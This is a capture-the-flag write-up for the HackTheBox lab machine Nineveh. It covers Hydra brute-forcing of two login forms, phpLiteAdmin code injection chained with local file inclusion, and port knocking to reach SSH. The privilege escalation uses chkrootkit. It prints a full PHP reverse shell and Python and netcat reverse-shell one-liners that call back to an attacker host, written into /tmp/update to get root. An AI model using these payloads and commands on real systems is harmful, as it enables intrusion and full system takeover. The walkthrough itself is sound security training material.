# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.43 -T5  
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/1.png">

# Enumeration
We'll start of with scanning for directories on port 80 and 443.

> I had troubles running gobuster against 443 due to an expired certificate. I tried it with dirbuster which did the trick. Later I found out that adding ```-k``` to your gopuster will disable certificate checks.

We found:
```
https://10.10.10.43/db
https://10.10.10.43/secure_notes
http://10.10.10.43/department
http://10.10.10.43/info.php

```

Hydra scan on https:
```
hydra -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -T 64 -V -l empty
```

Hydra scan on http:
```
hydra -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -T 64 -V -l admin
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/2.png">

Hydra bruteforced a password for each login form.

```
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
[443][http-post-form] host: 10.10.10.43   login: empty   password: password123
```

# SSH Key
The image on ```https://10.10.10.43/secure_notes``` contains a hidden messages. Running the file trough ```strings``` reveals a SSH private key.
But we are unable to connect as port 22 is closed. (At least for now)

# Exploiting RCE and LFI
After a quick Google search we learn that phpLiteAdmin version 1.9 is vulnerable to remote PHP code injection.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/3.png">

> https://www.exploit-db.com/exploits/24044

We'll have to create a database and give it a ```php``` extension. Then we'll add a table and add a php command in the filed. We will use this to test if the exploit works.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/4.png">

At this moment it's not sure how we can access the database and hereby executing the php script.
Let continue with the other login at ```http://10.10.10.43/department```. Maybe we can chain some things together.

There appears to be local file inclusion vulnerability but if we change the address we get the message saying there's no note selected. 

If we rename the database so it includes ```ninevehNotes.txt``` we hopefully can bypass this.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/5.png">

We can use the local file inclusion vulnerability in combination with the reverse code injection to run our test script:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/6.png">

# Initial Foothold
Now let's change the script to a reverse php shell in order to get a shell on the host. 

```php
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.14.9"; $port = 4444; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\n"; } } ?>
```

We now have a low privilege shell on the host as user ```www-date```. Running ```which python``` shows that Python is installed so we can stabilize the shell a bit:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

We can download and run ```linpeas.sh``` to do some enumerating. We spot a cronjob in ```/usr/sbin/report.sh``` but we don't have permissions to view or edit the file.

Strange thing is that we find port 22 being used but it didn't turn up during our initial portscan. Is there some mechanism preventing us from accessing it?

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/7.png">

After some digging around we found out that ```knock``` is running as ```root```. 
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/8.png">

> Wiki: In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s)

Now let's go look for some config files to see if we can get the knock key:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/9.png">

Found it at ```/etc/knockd.conf```. (We also found it in ```/var/mail/armois```).
Now we can use that key to open up the port for us:
```
knock 10.10.10.43 571 290 911 && ssh -i rsa amrois@10.10.10.43
```
We're now logged in as ```amrois```

# Privilege Escalation
Let's investigate the cronjob that we found earlier. It deletes every file in the ```/report``` directory. These files are generated by ```chkrootkit``` which scans files for the existence of rootkits. There is known vulnerability where we can run a file to our liking, thus granting us root privileges. 

> https://www.exploit-db.com/exploits/33899

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Nineveh/assets/10.png">

The file ```/tmp/update``` is executed by ckhrootkit as root. As this file does not currently exist, it is possible to put a bash script in its place and use it to grant us a root shell.

Let's craft our update file:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

chmod +x /tmp/update
```
Or:
```
echo -e "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4445 >/tmp/f" > /tmp/update

chmod +x /tmp/update
```
And have out netcat listener ready:
```
rlwrap nc -nlvp 4445
```
After a short moment our reverse shell as root will pop up.









